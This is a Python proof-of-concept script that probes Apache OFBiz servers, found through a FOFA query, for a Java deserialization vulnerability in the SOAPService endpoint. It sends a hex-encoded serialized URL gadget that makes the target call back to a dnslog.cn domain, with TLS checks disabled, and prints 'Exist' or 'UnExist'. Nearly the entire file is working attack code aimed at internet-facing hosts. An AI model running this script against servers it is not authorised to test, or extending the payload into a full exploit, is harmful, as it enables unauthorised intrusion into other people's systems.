#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:app="Apache_OFBiz"')


def run_proto(url):
    url = url + "/webtools/control/SOAPService"
    headers = {
        "Content-Type": "application/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
    }
    data = '''<soapenv:Envelope
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header/>
            <soapenv:Body>
                <ser>
                    <map-HashMap>
                        <map-Entry>
                            <map-Key>
                                <cus-obj>bcc62005737220116a6176612e7574696c2e486173684d617005070c341c16606403200246200a6c6f6164466163746f724920097468726573686f6c6478703f4020202020200c770820202010202020017372200c6a6176612e6e65742e55524cfb2537361a7fa37203200749200868617368436f6465492004706f72744c2009617574686f726974797420124c6a6176612f6c616e672f537472696e673b4c200466696c6571207e20034c2004686f737471207e20034c200870726f746f636f6c71207e20034c200372656671207e20037870a0a0a0a0a0a0a0a07420107435336c71392e646e736c6f672e636e7420012f71207e2005742004687474707078742018687474703a2f2f7435336c71392e646e736c6f672e636e2f780a</cus-obj>
                            </map-Key>
                            <map-Value>
                                <std-String value="http://t53lq9.dnslog.cn/"></std-String>
                            </map-Value>
                        </map-Entry>
                    </map-HashMap>
                </ser>
            </soapenv:Body>
        </soapenv:Envelope>'''
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=url, data=data, headers=headers, timeout=(6, 6), verify=False)
        reC_headers = re.search('OFBiz.Visitor', str(response.headers), re.I)
        if "deserializing" in response.text and "errorMessage" in response.text and reC_headers and response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False


def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')